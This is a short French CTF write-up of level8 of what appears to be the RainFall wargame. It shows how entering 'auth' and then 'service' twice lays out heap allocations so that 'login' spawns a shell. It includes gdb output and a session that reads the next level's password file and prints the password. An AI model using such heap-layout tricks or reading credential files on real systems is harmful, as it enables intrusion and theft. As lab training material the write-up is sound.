# Level8

On constate que le programme est une boucle qui change de comportement en fonction des entrees clavier.
Le programme verifie que "auth " est entre pour initialise "auth" a 0 a l'adresse "0x804a008"

Quand nous entrons "service" une premiere fois nous ecrivons une adresse sur le tas a auth+4 ("0x804a018").
Il suffit d'entrer une nouvelle fois service pour entrer une adresse a auth+8 ("0x804a028").

En entrans login nous passons donc dans la condition et comme auth[8] != 0 , un bash est lancé.

```
0x804a028:      0x00000000
(gdb) c
Continuing.
service
0x804a008, 0x804a028

Breakpoint 1, 0x08048596 in main ()
(gdb) x/x 0x804a028
0x804a028:      0x0000000a <=== apres deuxieme "service"
```

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```